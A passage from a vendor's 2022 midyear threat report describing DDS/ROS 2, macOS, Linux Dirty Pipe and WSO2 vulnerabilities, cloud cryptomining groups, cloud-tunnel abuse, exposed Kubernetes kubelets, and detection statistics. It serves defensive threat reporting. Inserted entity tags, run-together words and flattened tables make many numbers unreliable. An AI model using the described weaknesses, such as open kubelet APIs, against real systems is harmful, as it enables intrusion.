cybersecurity perspective . The entry includedinformation on [CARDINAL] 13 new vulnerabilities for the [CARDINAL] six most common [ORG] DDS implementations.63 These new bugsalso affect [ORG] Robot [ORG] Operating [ORG] System [CARDINAL] 2 ( ROS 2 ) , the default operating system for robotics and automationthat uses [ORG] DDS as middleware , meaning that the impact of each vulnerability could affect more than justDDS itself.25 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 [ORG] Midyear [ORG] Cybersecurity ReportATT&CK ICSSurfaceVectorCVEScopeCVSSWeaknesses ( CWE)T0804 : [ORG] Brute [ORG] Force I / O T0814 : DoS T0827 : Loss of Control T0880 : Loss of Safety T0846 : Remote System Discovery T0856 : [ORG] Spoof [ORG] of [ORG] Reporting [ORG] MessageT0862 : Supply Chain T0873 : [ORG] Project [ORG] File InfectionRTPS discovery packetCVE-2021 - 38425*Fast - DDS , [GPE] ROS 2CVE-2021 - 38429*OpenDDS , [GPE] ROS 2CVE-2021 - 38487*Connext [ORG] DDS , [GPE] ROS 2CVE-2021 - 43547*CoreDX [ORG] DDS , [ORG] ROS 2NetworkCVE-2021 - 38447OpenDDS , [ORG] ROS [ORG] 2Malformed RTPS LengthCWE-131 : Incorrect Calculation of Bu\ufb00er SizeCWE-122 : Heap - based [ORG] Bu\ufb00er Over\ufb02owCWE-121 : [ORG] Stack - based [ORG] Bu\ufb00er Over\ufb02owCWE-228 : [PERSON] Improper [PERSON] Handling of Syntactically Invalid Structure CWE-123 : Write - what - where ConditionFigure 20 . The [CARDINAL] 13 new [ORG] DDS vulnerabilities that were discovered via a collaboration between [ORG] Trend [ORG] Micro [ORG] Research , [ORG] TXOne [ORG] Networks , and ZDI in partnership with [PERSON] ADLINK [PERSON] Labs and [PERSON] Alias [PERSON] Robotics ; thevulnerabilities cover the network and configuration attack surfaces . The [ORG] DDS vulnerabilities can be divided into those that affect the network level and those that affect theconfiguration level . The former can be exploited to implement a variety of malicious techniques such asdenial - of - service ( [NORP] DoS ) attacks , spoofing , and automated collection , while the latter can be used to targetDDS system developers and integrators . To test how an actual attack might work , our researchers used the Gazebo simulator to create anenvironment using physics engines to mimic a real - world scenario . Using this setup , we were able tosimulate an attack on an autonomous driving platform , thereby crafting a scenario where a maliciousactor can exploit CVE-2021 - 3844764 and CVE-2021 - 38445.65 Upon exploitation , the ROS 2 nodes wouldeither crash or allow the attacker to execute arbitrary code within the system . [ORG] CVE IDDescriptionScopeCVSSRoot CauseCVE-2021 - 38447CVE-2021 - 38445An attacker remotely executes arbitrary code due to OCI OpenDDS versions prior to [CARDINAL] 3.18.1 being unable to handle a length parameter consistent with the actual length of the associated data . An attacker remotely executes arbitrary code due to OCI OpenDDS versions prior to [CARDINAL] 3.18.1 being unable to handle a length parameter consistent with the actual length of the associated data . OpenDDS , [GPE] ROS [PERSON] 28.6Resource [PERSON] exhaustionOpenDDS , [GPE] ROS 27.0Failed assertionFigure [CARDINAL] 21 . Details of how CVE-2021 - 38447 and CVE-2021 - 38445 can be exploited to launch an attackon an autonomous driving platform26 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 [ORG] Midyear [ORG] Cybersecurity [ORG] ReportNotable [ORG] Vulnerabilities [ORG] Affecting Non - [ORG] Windows [ORG] Operating [ORG] SystemsSome of the noteworthy vulnerabilities we discovered and analyzed in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2022 affectedplatforms other than Windows . In [DATE] April [DATE] 2022 , we released a blog entry about our discovery and analysisof CVE-2022 - 22639,66 a vulnerability in suhelperd , a helper daemon process for the macOS SoftwareUpdate that contains the class [ORG] SUHelper . This class is responsible for a critical system service via theinter - process communication ( [ORG] IPC ) mechanism . The successful exploitation of CVE-2022 - 22639 can leadto an attacker gaining root privileges that they can use for malicious attacks.67 [ORG] Apple has since patchedthis bug via the macOS Monterey 12.3 update released in [DATE] March [DATE] 2022.68There were also prominent vulnerabilities affecting Linux- and Unix - based operating systems . CVE-2022 - 0847 , also known as [ORG] Dirty Pipe,69 is a bug that affects the Linux kernel from versions [CARDINAL] 5.8 and up . It exploitsa flaw in the Linux kernel \u2019s memory management , specifically through how pipe page caches are mergedand overwrite other page caches.70 [PERSON] Dirty [PERSON] Pipe , which can potentially allow the elevation of an attackerto root privileges on the host , is relatively easy to exploit . It is therefore vital for organizations to checkwhether they are using vulnerable versions of the Linux kernel . Upon learning that these are vulnerable , they must then update their systems according to Linux kernel versions [CARDINAL] 5.16.11 , 5.15.25 , and 5.10.102or later.71On the other hand , CVE-2022 - 2946472 is a critical RCE vulnerability that affects several products fromWSO2 , a technology provider that offers open - source platforms for integrating application programminginterfaces ( APIs ) , applications , and web services:\u2022 WSO2 API Manager 2.2.0 and above\u2022\u2022\u2022Identity Server 5.2.0 and aboveIdentity [PERSON] Server [PERSON] Analytics 5.4.0 to 5.6.0Identity Server as Key Manager 5.3.0 and above\u2022 Open Banking AM 1.4.0 and above\u2022 Enterprise Integrator 6.2.0 and above27 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear Cybersecurity ReportExploitation of this flaw , which does not require user interaction or administrative privileges , can allowattackers to infiltrate the networks of affected systems . Since [DATE] April [DATE] 2022 , we have been seeing CVE-2022 - 29464 exploit attempts in the wild . These attemptsoccurred after a proof of concept for the exploit was published in GitHub.73 Shortly after this was posted , a [GPE] Metasploit module for affected environments was made available.74 These exploit attempts involve theinstallation of Cobalt Strike beacons and other malware as part of the attack routine.75As with the other vulnerabilities discussed in this section , we encourage organizations using affectedWSO2 products to update their systems or apply the temporary mitigation recommendations as suggestedby their respective security advisories.76 WSO2 has since released a patch addressing this vulnerability.7728 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 [ORG] Midyear [ORG] Cybersecurity [ORG] ReportOld [ORG] Issues , Unconventional Attacks Plague Cloud Environments Cloud - Based Cryptocurrency Mining Attacks From Threat Actors Like TeamTNT and Kinsing Are on the [ORG] RiseCloudtechnologieshaveexperiencedexplosive growth over the last decade,78 withmany organizations shifting at least part of theirinfrastructure to the cloud due to the benefitsit provides , such as cost savings , operationalresilience , business agility , and automation . ThisPredictionsIn our [DATE] 2022 security predictions , wespeculated that cloud attackers wouldcontinue to follow technology trendswhile still using traditional attacks ontrend is expected to continue in [DATE] the [DATE] next [DATE] few [DATE] years , cloud users.with [PERSON] Gartner forecasting that public cloud spendingalone will reach [MONEY] nearly US$ 500 [MONEY] billion in [CARDINAL] 2022.79While widespread adoption of the cloud has made many businesses run more efficiently , it has also madecloud - based systems an attractive target for malicious actors looking to expand the regular scope of theiroperations . Although cryptocurrency prices declined sharply during [DATE] the [DATE] first [DATE] half of [CARDINAL] 2022,80 schemes built aroundit do not require high investment costs since typical cryptocurrency - based attacks rely on the victim\u2019sinfrastructure and resources to mine cryptocurrencies . Traditionally , the most efficient method of cryptocurrency mining involved the use of expensive machineswith powerful GPUs . Other types of cryptocurrency mining , such as CPU - based mining , can also beprofitable , but only at scale where sheer numbers can make up for the difference in performance . Sincemost users do not have high - end graphical powerhouses at their disposal , some groups have begun29 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear Cybersecurity Reportfocusing their efforts on quantity over quality by relying instead on compromising cloud instances forcryptocurrency - mining operations.81In our research into cloud - based cryptocurrency mining , we investigated the primary threat actors thatinhabit this space and determined the [CARDINAL] five most prominent groups and how they conduct their operations : [GPE] Outlaw is a threat actor that prefers to stick to the tools and techniques it knows , with relatively littlechange in its operations over the years.82 [ORG] Outlaw \u2019s preferred targets include [ORG] IoT devices and Linux cloudservers , which it compromises by exploiting known vulnerabilities or performing brute - force [PERSON] Secure [PERSON] Shell(SSH ) attacks . TeamTNT is a group we \u2019ve covered extensively over [DATE] the [DATE] past [DATE] couple of years.83 The threat actor is knownfor being active in social media , going as far as replying to researchers who have analyzed their attacks . TeamTNT has evolved quickly over a short period , making it one of the most technically proficient threatactors focused on cryptocurrency mining . The group \u2019s preferred modus operandi is to exploit vulnerablesoftware to compromise hosts before performing credential theft as a precursor for lateral movementwithin the victim \u2019s system and exploiting misconfigurations . Kinsing , at least in terms of online presence , can be considered an antithesis to TeamTNT since the groupdoes not maintain any noticeable presence on social media or even in underground forums . However , itshares some similarities with its rival in terms of its ability to quickly adapt and evolve its operationalkit.84 The group is also known for its quick adoption of new exploits , as seen in its use of the Log4Shellvulnerability [DATE] just [DATE] a [DATE] few [DATE] days after it was [ORDINAL] first made public.858220 is a group that has been a frequent exploiter of vulnerabilities , primarily those that affect OracleWebLogic Server . After a relatively quiet [DATE] 2020 , we observed that the group became much more active in2021 , with [CARDINAL] approximately [CARDINAL] 10 times the activity levels in [DATE] the [DATE] previous [DATE] year . The threat actor has also beenknown to compete with Kinsing for the same resources , with the [CARDINAL] two often kicking each other out fromcompromised machines to install their own cryptocurrency miners . [ORG] Kek [ORG] Security is a relatively new group that has been garnering attention due to its sophistication andpenchant for integrating new exploits into its attacks . Kek Security is also continuously developingits malware , with some of its more recent additions providing better obfuscation capabilities to evadedetection and prevent researcher analysis.30 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear [ORG] Cybersecurity [ORG] ReportOutlawActive since [CARDINAL] 20172018201920202021SophisticationVulnerability exploitationSocial media presenceTeamTNTActive since [CARDINAL] 20172018201920202021SophisticationVulnerability exploitationSocial media presenceKinsingActive since [CARDINAL] 20172018201920202021SophisticationVulnerability exploitationSocial media presence8220Active since [CARDINAL] 20172018201920202021SophisticationVulnerability exploitationSocial media presenceKek SecurityActive since [CARDINAL] 20172018201920202021SophisticationVulnerability exploitationSocial media presenceFigure [CARDINAL] 22 . A diagram showing the [CARDINAL] five primary threat actors in the cloud - based cryptocurrency - miningspace , how long they have been active , their level of sophistication , social media presence , andtendency to exploit vulnerabilities as part of their routines31 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear Cybersecurity ReportGiven that all these groups are targeting both common and limited resources , we witnessed multipleinstances where different threat actors fought over the same machines , often using kill scripts to deal withcompetitors . It is this cutthroat competition that drives a large portion of the innovations implemented bythe various threat actors . Primarily , these innovations involve adding capabilities that would allow them totarget systems that their adversaries cannot . Malicious Actors Abuse Cloud Tunneling Services for Cloud - Based AttacksSome of the advantages that cloud technologies provide can likewise present security challenges fororganizations . For example , the cloud \u2019s ability to swiftly deploy assets and services helps organizations bemore efficient ; however , it can also prevent them from having full visibility over deployed assets . [NORP] Attackerscan take advantage of this by launching attacks using more unconventional methods in places that [ORG] ITteams and security staff are less likely to monitor . We recently observed malicious actors abusing cloud tunnels , a service used by both individuals andbusinesses to expose their internal systems to the internet by relaying traffic through cloud - basedinfrastructure . In enterprise settings , these kinds of services are used by developers to test and deploycode , as well as to make certain services available to select users on the internet . In other words , cloudtunneling serves as a convenient tool that allows users to deploy local development services withoutneeding to configure network firewalls and register domain names . Due to its growing popularity , cloud tunneling services have become a prime target for malicious actorslooking to expand their operations . [ORG] Groups that employ cloud tunneling services normally use them fortransitory purposes so that they will not need to maintain permanent infrastructures , as well as to addanother layer of secrecy by masking their real locations.86Cloud tunneling threats can be categorized into [CARDINAL] two distinct types : internal threats and external threats . Internal threats refer to attacks where the service is used ( either purposefully or unknowingly ) to exposeinternal services such as [ORG] Server [ORG] Message [ORG] Block ( SMB ) , [ORG] FTP , and HTTP . On the other hand , externalthreats involve traditional attacks and routines such as phishing and [ORG] C&C communication via the cloudtunnel . In [CARDINAL] one blog entry in [DATE] September [DATE] 2020 , we discuss an instance where an insider attack involved the abuseof legitimate tools and services . In particular , a malicious actor used ngrok to expose an [PRODUCT] SMB port , eventually leading to the download and execution of a keylogger.87 In contrast , external attacks are morecommon and usually involve operations that integrate cloud tunneling services for the routing of malwaretraffic or the hosting of phishing websites.32 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear Cybersecurity ReportCloud Misconfiguration Remains an Issue for [ORG] OrganizationsThe growth of the container market , which is estimated to reach US$ 8.2 [MONEY] billion by [DATE] 2025 , has made itan appealing target for cloud - focused threat actors.88 While containers can provide organizations anincrease in the speed and efficiency of their development cycles , failure to implement proper securitycontrols could result in compromise at various stages of the pipeline , from hijacked repositories to theexploitation of weaknesses in specific components of the container software.89Misconfigured container software remains a significant issue for many organizations . According to asurvey from [ORG] Red [ORG] Hat encompassing over [CARDINAL] 300 [ORG] DevOps , engineering , and security professionals , 53 % ofthe respondents detected a misconfiguration in their container and/or [PERSON] Kubernetes deployment.90We investigated [CARDINAL] one of the primary misconfiguration issues in [LOC] Kubernetes deployments , specificallyKubernetes clusters that are publicly exposed via port [CARDINAL] 10250.91 The kubelet is an integral part of [ORG] Kubernetes , and it is responsible for ensuring that all containers are running in a pod and performing functions , suchas helping nodes join the [ORG] Kubernetes cluster , managing the health of containers , and keeping the controlupdated on node information . Port [DATE] 10250 , which is used by the kubelet API , is typically inaccessible toexternal services as it is exposed internally . However , based on [NORP] Shodan data , we were able to use [ORG] IP address information and a simple script tosend requests to the kubelet API to identify over [CARDINAL] 240,000 exposed [ORG] Kubernetes cluster nodes . [ORG] Althougha significant number of these nodes returned HTTP \u201c [CARDINAL] 401 Status Code \u2013 Unauthorized , \u201d meaning thatthey were blocking anonymous requests , a skilled malicious actor can still compromise the kubeletauthentication token or use other exploits , thereby endangering the clusters . [CARDINAL] Approximately [CARDINAL] 600 nodesreturned the \u201c [CARDINAL] 200 \u2013 OK \u201d notification , resulting in some nodes that are running a kubelet providinginformation on pods in that specific node . For these exposed nodes , an attacker can install and runprograms via the kubelet API.Meanwhile , [ORG] Trend [ORG] Micro [ORG] Cloud [ORG] One \u2122 Conformity data shows the tools and services with the highestlevels of service misconfiguration rates ( based on total checks ) from [ORG] Amazon [ORG] Web [ORG] Services ( AWS),Microsoft Azure , and Google Cloud Platform ( GCP ) . In particular , Azure \u2019s activity log service had highmisconfiguration rates and was associated with a high number of high - risk rules ( based on [ORG] Conformityrisk level rating).33 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear Cybersecurity ReportAmazon Web Services99.4%98.9%95.5%94.7%92.8%Macie2ComprehendCloudWatch [ORG] LogsCost [ORG] ExplorerInspector8278760e rulesMicrosoft Azure100%100%99.97%99.26%98.45%4141084AdvisorLocksResourcesActivity LogSearch100806040200020406080100120High - risk [PERSON] rulesGoogle [PERSON] Cloud Platform98.40%Cloud Logging83.60%79.7%66.5%64.05%BigQueryCloud [GPE] APICloud IAMCloud SQL358416 41161e rulesFigure [CARDINAL] 23 . The top [CARDINAL] five services with the highest levels of misconfiguration rates ( based on total checks)from [ORG] Amazon [ORG] Web [ORG] Services ( AWS ) , [ORG] Microsoft [ORG] Azure , and Google [PERSON] Cloud [PERSON] Platform ( GCP)34 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear Cybersecurity ReportThe Evolving Attack Surface Requires Effective Multilayered Defenses and Security TechnologiesIf there is anything we can glean from the current state of cybersecurity , it \u2019s that the growth of the digitalattack surface has organizations scrambling to fill as many security gaps as they can . After [DATE] two [DATE] years ofremote work , some employees have started to shift back in some capacity to their on - site workplaces , while others have adopted a hybrid arrangement . These varying configurations in working environments , together with the growing number of technologies that are being integrated into business operations , area call for organizations to allocate additional resources to cover as much of the attack surface as possible . Over time , threat actors have become more dangerous , launching attacks that have grown in both scaleand sophistication . It comes as no surprise , therefore , that threat actors now exploit multiple sections ofthe attack surface in a single campaign : After all , the rising popularity of service - based malware has madeit easier for cybercriminals to launch attacks and for malware developers to hide their tracks . The evolution of ransomware from the more innocuous attacks of yesteryear to the double \u2014 and eventriple \u2014 extortion schemes of today means that defending systems against modern ransomware familiescannot be viewed as anything less than top priority . In the same vein , widespread technologies suchas cloud services , where organizations do not physically control the infrastructure , must still rely on theshared responsibility model for effective security.92The [ORDINAL] first step in attack surface management ( [ORG] ASM ) is the discovery of the attack surface itself , whereorganizations examine their assets and determine elements such as the critical importance of an asset , any potential vulnerabilities , the level of threat activity , and how much threat intelligence is being gatheredfrom their assets . Assessing available security controls and how they offset risks is also an importantpreliminary step in planning an organization \u2019s ASM.35 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear Cybersecurity ReportOne integral component of [ORG] ASM is visibility , as it provides valuable information on potential threats . [ORG] Inturn , this can help enterprises determine their risk exposure and allow them to take the necessary stepsto mitigate these risks.93Proper security protocols and best practices go a long way toward helping businesses protect their systemfrom attacks . Organizations should prioritize updating their software as soon as possible to minimize thechance of attackers successfully exploiting vulnerabilities in their system . Other options , such as virtualpatching , can help organizations protect their machines while they wait for vendors to provide securityupdates . Cloud users , meanwhile , should ensure that their cloud infrastructure is set up properly withappropriate security protocols in place to prevent attackers from capitalizing on misconfigurations . Usereducation is also a key part of a successful security posture since end users often serve as the weakestlinks that malicious actors try to exploit to gain access to other parts of an organization \u2019s system . However , the complex reality of securing infrastructure , systems , and endpoints means that even withthese in place , securing each possible point of attack would still be challenging without the right securitytools in place . While there are technologies that can individually handle security for different parts of a system , thesealso come with their own drawbacks , such as the inability to correlate different data points from eachsiloed source . Security teams are thus limited to working with only pieces of the puzzle at a time whentrying to determine how an attack happened and where it came from . A single platform that can cover the entire attack surface is the ideal solution for organizations , especiallythose with limited resources . With a comprehensive platform , organizations stand to gain completevisibility over their attack surface , not to mention the ability to correlate different indicators so that theycan focus on the bigger picture . A unified security platform can also provide multilayered protection whilehelping reduce expenditures that would otherwise be spent on multiple security technologies.94 Lastly , tominimize potential security gaps , this platform must be configurable and capable of providing continuousprotection of digital assets to minimize potential security gaps.36 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 [ORG] Midyear [ORG] Cybersecurity [ORG] ReportThe [ORG] Threat [ORG] Landscape in BriefIn [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2022 , the [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Protection [ORG] Network protected users from more than 63billion threats consisting of email threats , mobile app threats , [ORG] IoT threats , network threats , malicious files , and malicious URLs.63,789,373,773 2,911,929,067,913Blocked threatsOverall queriesBlocked email threatsBlocked malicious URLsBlocked malicious files33,316,115,08838,493,160,6921,299,974,1621,398,395,5246,340,820,72322,418,695,205010B20B30B40B0300M600M900M1.2B1.5B05B10B15B20B25BBlocked mobile app threatsBlocked [ORG] IoT threats18,395,05717,494,6422,197,2182,448,759Blocked [ORG] Smart HomeNetwork [CARDINAL] threats1,798,780,1531,459,178,95105M10M15M20M0500K1M1.5M2M2.5M0500M1B1.5B2BEmail reputation queriesURL reputation queriesFile reputation queries42,985,439,36747,042,065,5251,645,676,427,450959,840,620,0621,835,343,686,002988,766,090,746010B20B30B40B50B0500B1T1.5T2T0200B400B600B800B1TMobile reputation app queriesIoT reputation [ORG] queries22,170,980,58823,953,990,10915,564,853,20016,823,235,53105B10B15B20B25B05B10B15B20B1H 20211H 2022Figure 24 . There was an increase in every metric for blocked threats and reputation queries in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021 compared to [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2022 based on blocked email , file , and URL threat data and queries in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] each [DATE] year . The number of blocked maliciousfiles also saw a significant increase . Source : [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Protection [ORG] Network37 [ORG] | [ORG] Defending [ORG] the [ORG] Expanding [ORG] Attack [ORG] Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear Cybersecurity ReportThe number of blocked malicious files has been seeing an upward trend since [DATE] 2020 : From [CARDINAL] just [CARDINAL] over [CARDINAL] 1billion blocked files in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2020 , this number has increased to over [MONEY] 22 [MONEY] billion [MONEY] by [MONEY] mid-2022 . Inaddition to improvements in [ORG] the [ORG] Smart [ORG] Protection [ORG] Network \u2019s feedback mechanism during this period , webelieve that both the pandemic and the shift to remote and hybrid work setups also contributed to thisgrowth in detections.25B20B15B10B5B1,028,006,974 01H [CARDINAL] 202022,418,695,20511,493,987,7156,340,820,7232,670,438,8972H 2022Figure 25 . There has been a steady increase in the number of blocked files since the start of 2020,which has doubled approximately each [DATE] half - [DATE] year since . Source : [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Protection [ORG] NetworkWeb shells were the top malware family in terms of detections in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2022 , followed by [PERSON] Emotet , which had a resurgence [DATE] this [DATE] year . Cryptocurrency miners had the [ORDINAL] third highest number of detections , withthe [ORG] Ulise and Powload trojans rounding up the top five.160,656148,70163,14338,73136,99829,78227,72027,13624,95723,905WebshellEmotetCoinminerUlisePowloadDLoaderNemucodDownadBondatWannaCry050K100K150K200KFigure [CARDINAL] 26 . The top [CARDINAL] 10 malware families in terms of detections in [DATE] the [DATE] first [DATE] half of [CARDINAL] 2022Source : Trend Micro Smart Protection Network38 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 [ORG] Midyear [ORG] Cybersecurity ReportTrend Micro [ORG] Smart [ORG] Protection [ORG] Network data reveals that government , manufacturing , and healthcareremained the industries with the highest number of malware detections in [DATE] the [DATE] first [DATE] half [DATE] 2022 . Still , therewere some changes at the top , with government targets overtaking the manufacturing industry and thetechnology sector replacing banking in the top [CARDINAL] five . Manufacturing 4.3%Government [QUANTITY] 2.4%Healthcare [QUANTITY] 2.1%Manufacturing 2.3%Government 2.3%Healthcare 2.0%Education 1.6%Banking 1.2%Others 88.4%Education 1.6%Technology 1.4%Others 90.4%Figure [CARDINAL] 27 . A comparison of the top [CARDINAL] five industries with the highest number of malware detections in [DATE] thefirst [DATE] half [DATE] of [DATE] 2021 and [CARDINAL] 2022Source : Trend Micro Smart Protection NetworkWe detected significantly fewer new ransomware families in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2022 vis - \u00e0 - vis the [ORDINAL] first halfof [DATE] the [DATE] previous [DATE] year . However , there were still some noteworthy new ransomware families , such asCheerscrypt , that made their debut [DATE] this [DATE] year . It \u2019s also possible that other ransomware operators arestarting to turn toward RaaS and other similar operations instead of developing their own families.49101H 20211H 202201020304050Figure 28 . A [DATE] half - [DATE] year comparison of the detections of new ransomware familiesSource : [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Protection Network39 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear Cybersecurity ReportJanFebMarAprMayJunNo new familiesNo new familiesExplusCheerscryptKeversenZagreuSNoEscapeStorageCryptLorenzPalangBlazeEvilNominatusTable [CARDINAL] 3 . In [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2022 , [CARDINAL] only [CARDINAL] 10 new ransomware families were discovered , with no newransomware families in [DATE] January and [DATE] February : New ransomware families in [DATE] the [DATE] first [DATE] six [DATE] months [DATE] of [DATE] 2022The Fortinet path traversal vulnerability CVE-2018 - 13379,95 which occurs in Fortinet \u2019s FortiGate SSL , wasthe top [ORG] VPN flaw during [DATE] the [DATE] first [DATE] half [DATE] of [DATE] the [DATE] year , peaking in [DATE] June with over [CARDINAL] 90,000 exploit attempts . Meanwhile , CVE-2021 - 22986,96 a bug affecting [ORG] the [ORG] iControl [ORG] REST [ORG] Interface of the [FAC] F5 software , had thehighest individual month in terms of exploit attempts with over [CARDINAL] 100,000 detections in [DATE] June [DATE] 2022.CVEDigital VaccinefilterJanFebMarAprMayJunTotalFortinetCVE-2018 - 13379DV-3608721,71021,73326,40525,07732,59090,700218,215Pulse [ORG] SecureCitrix SystemsCVE-2019 - 11510DV-360898,7088,20410,11014,95016,22648,098106,296DV-362415067751,9401,4831,8001,7658,269CVE-2019 - 11539DV-36095CVE-2021 - 22893DV-396360000000330102306CVE-2019 - 19781DV-368761,1206842,0681,1341,7703,36110,137Palo AltoCVE-2019 - 1579DV-38230DV-369272701506006707604302880F5CVE-2020 - 5902DV-3784119,33917,58134,50724,88136,07962,302194,689DV-38276 ( Malware)0000CVE-2021 - 22986DV-393601,3202,5031,48117344631301239403924105,4461,87091303SonicWallCVE-2021 - 20016CiscoCVE-2021 - 1609CVE-2021 - 1610DV-39352DV-39364DV-39727 ( Malware)DV-41488NoneNone3,1263,4193,4183,88454,692105,075173,6140000000000000000000000000000Table 4 . A [DATE] monthly comparison of detected attempts to exploit notable [ORG] VPN vulnerabilitiesin [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2022Sources : [ORG] Trend [ORG] Micro [ORG] TippingPoint [ORG] Threat [ORG] Protection [ORG] System , [GPE] Japan \u2019s Information - Technology PromotionAgency ( [ORG] IPA ) , and [ORG] the [ORG] Japan [ORG] Computer [ORG] Emergency [ORG] Response [ORG] Team ( JPCERT ) Coordination Center40 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear Cybersecurity ReportThere was an 11.4 % increase in blocked [ORG] IoT threats for [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2022 compared to [DATE] the [DATE] first [DATE] half [DATE] ofthe [DATE] previous [DATE] year , indicating that malicious actors focusing on [ORG] IoT were more active with their campaignsduring this period.2,197,2182,448,7591H 20211H 2022Figure 29 . The number of blocked [ORG] IoT threats increased by 11.4 % : A comparison of blocked [ORG] IoT [DATE] threats0500K1M1.5M2M2.5Min [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2022 compared to [DATE] the [DATE] first [DATE] half [DATE] of 2021Source : Trend Micro Smart Protection [ORG] NetworkOne of the noteworthy incidents involving [ORG] IoT platforms occurred when a variant of a modular botnetcalled [PERSON] Cyclops [PERSON] Blink , previously linked to [ORG] the [ORG] Sandworm [ORG] APT [DATE] group,97 was found to have targeted Asusrouters using a specially designed module that can access an infected device \u2019s flash memory , whichallowed it to retrieve information and even survive system resets.98 Although [PERSON] Cyclops [PERSON] Blink , which hadpreviously attempted to launch attacks on [PERSON] WatchGuard [PERSON] Firebox,99 is regarded as a state - sponsoredbotnet , our research revealed that the targeted devices were not necessarily part of critical infrastructureor industries . It is therefore likely that the attempted attacks on Asus routers were part of its operator\u2019sattempts to expand its infrastructure for future attacks on higher - value targets . Asus has since released asecurity bulletin that offers firmware updates for affected devices.100Upon looking at trends in [DATE] recent [DATE] years , we have observed a steady dip in cryptocurrency miner detections , which peaked in [DATE] 2018 . [DATE] The [DATE] first [DATE] half [DATE] of [DATE] 2022 , for example , saw a noticeable decrease from the previoustwo [DATE] half - [DATE] years . [CARDINAL] One possible reason for this dip is the crash in cryptocurrency prices [DATE] midyear due tovarious external issues.101 It is likely that this led to cybercriminals \u2019 reduced interest in cryptocurrency - mining schemes.41 [WORK_OF_ART] | [WORK_OF_ART] Defending [WORK_OF_ART] the [WORK_OF_ART] Expanding [WORK_OF_ART] Attack [WORK_OF_ART] Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear Cybersecurity Report787,146563,805307,703186,69889,26570,78274,49076,41963,1431H 20182H 20181H 20192H [DATE] 20191H 20202H [DATE] 20201H [DATE] 20212H [DATE] 20211H 20220200K400K600K800KFigure [CARDINAL] 30 . A comparison of cryptocurrency miner detections from [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021to [DATE] the [DATE] first [DATE] half of [CARDINAL] 2022Source : Trend Micro Smart Protection NetworkHowever , cryptocurrency - mining malware has been seeing growth in Linux operating systems . Halfwaythrough [DATE] 2022 , we observed an [PERCENT] approximately 145 % increase in detections for Linux - based cryptocurrencyminers as opposed to the same period in [DATE] 2021.2,6776,5551H [DATE] 20211H [DATE] 2022Figure [DATE] 31 . A [DATE] half - [DATE] year comparison of the number of detections for Linux - based cryptocurrency miners02K4K6K8Kshowing a 145 % growthSource : Trend Micro Smart Protection NetworkWe observed certain cryptocurrency malware - related trends during [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2022.102 For example , the rise of new technologies such as non - fungible tokens ( NFTs ) has made them prime targets forscammers . Some of the scams we observed involving NFTs include using fake [ORG] NFT trader domains that42 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear [ORG] Cybersecurity [ORG] Reportare designed to trick users into connecting their wallets to fraudulent sites to open the way for furtherattacks . We also found examples of NFTs with phishing links in the description being airdropped tounwary users \u2014 again to trick them into connecting their wallets . Another trend we recently spotted is the use of [GPE] Telegram as an avenue for launching cryptocurrencyscams . In [CARDINAL] one scenario , malicious actors disguised themselves as technical support representatives ina chat group , offering to help cryptocurrency users with their concerns . These fake representatives thentried to convince the victim to visit phishing sites that are designed to steal mnemonic seed phrases \u2014 aseries of unrelated words that are generated when a cryptocurrency wallet is created \u2014 and private keys . We also discovered similar scenarios involving [ORG] Telegram chat groups , where the group owners pretendedto be legitimate chat group administrators to trick users interested in cryptocurrencies into visiting scamweb pages . Our data shows a slight decrease ( 4.9 % ) in mobile device - related malicious samples in [DATE] the [DATE] first [DATE] half of2022 as opposed to [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021.18,395,05717,494,6421H [DATE] 20211H 20222000000005M10M15M20MFigure [DATE] 32 . A [DATE] half - [DATE] year comparison of the detections of mobile device - related malicious samplesSource : [ORG] Trend [ORG] Micro [ORG] Mobile [ORG] App [ORG] Reputation [ORG] ServiceAs for notable mobile malware - related incidents , we discovered malicious actors publishing fake mobileapps disguised as cryptocurrency - mining software designed to lure users into either subscribing for paidservices or selecting ads offering phony cryptocurrency earnings.103 Upon further analysis , we found thatone of these apps loaded a bogus website asking users to enter their private keys and mnemonic phrases , which would then be collected for future use.43 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear Cybersecurity ReportReferences1 [ORG] Trend [ORG] Micro . ( [DATE] 2022 ) . [ORG] Trend [ORG] Micro . 